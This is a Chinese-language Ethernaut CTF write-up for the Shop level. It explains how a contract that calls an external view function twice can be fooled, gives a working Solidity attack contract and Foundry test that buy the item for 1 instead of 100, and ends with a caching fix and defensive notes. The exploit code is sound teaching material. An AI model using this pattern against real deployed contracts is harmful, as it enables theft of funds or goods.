---
title: 'Ethernaut Level 21: Shop - 外部调用状态变化漏洞'
date: 2025-01-25 16:50:00
updated: 2025-01-25 16:50:00
categories:
  - Ethernaut 系列
  - 高级攻击篇 (21-25)
tags:
  - Ethernaut
  - Foundry
  - Reentrancy
  - View Function
  - 智能合约安全
  - Solidity
series: Ethernaut Foundry Solutions
excerpt: "利用一个看似是 `view` 的外部调用函数在两次调用之间改变状态，从而绕过安全检查。学习如何设计一个在不同调用中返回不同值的 `price()` 函数，以低于预期的价格买下商品，掌握 Shop 关卡的破解技巧。"
---

# 🎯 Ethernaut Level 21: Shop - 外部调用状态变化漏洞

> **关卡链接**: [Ethernaut Level 21 - Shop](https://ethernaut.openzeppelin.com/level/21)  
> **攻击类型**: 外部调用状态变化 / 伪 `view` 函数  
> **难度**: ⭐⭐☆☆☆

## 📋 挑战目标

你需要从 `Shop` 合约中买下商品。但有一个条件：你必须以低于原价（100）的价格买下它。最终目标是让 `price` 变量的值小于100，并且 `isSold` 为 `true`。

![Shop Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel21.svg)

## 🔍 漏洞分析

让我们看一下 `Shop` 合约的 `buy()` 函数：

```solidity
contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

// The interface the buyer must implement
interface Buyer {
    function price() external view returns (uint);
}
```

漏洞在于 `buy()` 函数对外部合约 `_buyer` 的 `price()` 函数进行了两次调用：

1.  **第一次调用**: 在 `if` 条件判断中 `_buyer.price() >= price`。
2.  **第二次调用**: 在 `if` 块内部，用于更新 `price` 变量 `price = _buyer.price()`。

`Buyer` 接口将 `price()` 函数标记为 `view`，这通常意味着该函数不应改变状态。然而，EVM **并不强制 `view` 函数不能依赖于状态**。一个外部合约的 `view` 函数完全可以在两次调用之间返回不同的值，只要它的返回值依赖于某些在两次调用之间发生变化的状态。

我们的攻击思路如下：

1.  创建一个攻击合约，实现 `Buyer` 接口。
2.  在攻击合约的 `price()` 函数中加入逻辑：如果 `Shop` 合约的 `isSold` 状态为 `false`，则返回一个大于或等于100的值（例如101），以通过 `if` 检查。如果 `isSold` 为 `true`，则返回一个小于100的值（例如1）。
3.  当我们调用 `buy()` 时：
    *   `if` 条件检查：`isSold` 是 `false`，我们的 `price()` 返回 `101`。`101 >= 100` 为真，检查通过。
    *   进入 `if` 块：`isSold` 被设置为 `true`。
    *   更新 `price`：`price = _buyer.price()` 被调用。此时 `isSold` 已经是 `true`，所以我们的 `price()` 函数返回 `1`。`Shop` 合约的 `price` 变量被更新为 `1`。

这样，我们就成功地以低价买下了商品。

## 💻 Foundry 实现

### 攻击合约代码

攻击合约实现了 `Buyer` 接口，其 `price()` 函数根据 `Shop` 合约的 `isSold` 状态返回不同的值。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function isSold() external view returns (bool);
    function price() external view returns (uint);
    function buy() external;
}

contract Attack {
    IShop shop;

    constructor(address _shopAddress) {
        shop = IShop(_shopAddress);
    }

    // 这个 price 函数是攻击的核心
    function price() public view returns (uint256) {
        // 如果商品还没卖出，返回高价以通过检查
        // 如果已经卖出（在同一次 buy 调用中），返回低价来更新 price
        if (shop.isSold()) {
            return 1;
        } else {
            return 101;
        }
    }

    function attack() public {
        shop.buy();
    }
}
```

### Foundry 测试代码

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/21_Shop.sol";

// Attack contract (as defined above)
contract Attack {
    IShop shop;
    constructor(address _shop) { shop = IShop(_shop); }
    function price() public view returns (uint256) { return shop.isSold() ? 1 : 101; }
    function attack() public { shop.buy(); }
}

contract ShopTest is Test {
    Shop instance;
    Attack attacker;
    address player;

    function setUp() public {
        player = vm.addr(1);
        instance = new Shop();
        attacker = new Attack(address(instance));
    }

    function testAttack() public {
        vm.startPrank(player);
        attacker.attack();
        vm.stopPrank();

        // 验证攻击是否成功
        assertEq(instance.price(), 1, "Price should be updated to 1");
        assertTrue(instance.isSold(), "isSold should be true");
    }
}
```

### 关键攻击步骤

1.  **部署攻击合约**: 创建 `Attack` 合约，它实现了 `Buyer` 接口。
2.  **调用 `attack()`**: `Attack` 合约的 `attack()` 函数调用 `Shop` 合约的 `buy()` 函数。
3.  **双重返回值**: `Shop` 合约在同一次 `buy()` 调用中两次调用 `Attack` 合约的 `price()` 函数，但由于 `Shop` 的内部状态 `isSold` 发生了变化，`Attack` 的 `price()` 函数返回了两个不同的值，从而绕过了逻辑检查并以低价成交。

## 🛡️ 防御措施

1.  **不要在一次交易中多次调用外部 `view` 函数**: 如果必须这样做，请将第一次调用的返回值存储在一个局部变量中，并在后续逻辑中使用这个局部变量，而不是再次进行外部调用。

    ```solidity
    // 修复建议
    function buy() public {
        Buyer _buyer = Buyer(msg.sender);
        uint _price = _buyer.price(); // 只调用一次，并将结果存入局部变量

        if (_price >= price && !isSold) {
            isSold = true;
            price = _price; // 使用局部变量
        }
    }
    ```

2.  **遵循“检查-生效-交互”模式**: 尽管本例中的交互是一个 `view` 函数，但它仍然是与外部合约的交互。最佳实践是在所有状态变更（“生效”）之后再进行交互。然而，在本例中，更好的修复方法是缓存返回值。

## 🔧 相关工具和技术

-   **`view` 函数的误解**: `view` 关键字只向编译器承诺该函数不会修改状态。它并不保证函数的返回值是纯粹的或在一次交易中保持不变。
-   **跨合约调用的状态依赖**: 一个合约的函数可以依赖于另一个合约的状态，这可能导致像本例中这样意想不到的行为。
-   **Foundry `prank`**: 模拟来自特定地址（`player` -> `attacker`）的调用链，是测试此类交互式攻击的理想工具。

## 🎯 总结

**核心概念**:
-   外部 `view` 函数的返回值不是恒定的，它可以在一次交易的不同阶段发生变化。
-   在一次函数执行中多次调用同一个外部 `view` 函数是一个危险的模式，因为它的返回值可能在你意想不到的时候发生改变。

**攻击向量**:
-   设计一个恶意的 `view` 函数，使其根据目标合约的状态返回不同的值。
-   利用目标合约在检查和执行阶段之间状态的变化，来操纵 `view` 函数的返回值，从而绕过安全检查。

**防御策略**:
-   当需要多次使用外部调用的结果时，应将其缓存在一个局部变量中，以确保其在整个函数执行过程中的一致性。

## 📚 参考资料

-   [Solidity Docs: View Functions](https://docs.soliditylang.org/en/latest/contracts.html#view-functions)
-   [SWC-113: DoS with Failed Call](https://swcregistry.io/docs/SWC-113) (虽然不是直接的DoS，但原理相似，都涉及到对外部调用结果的错误处理)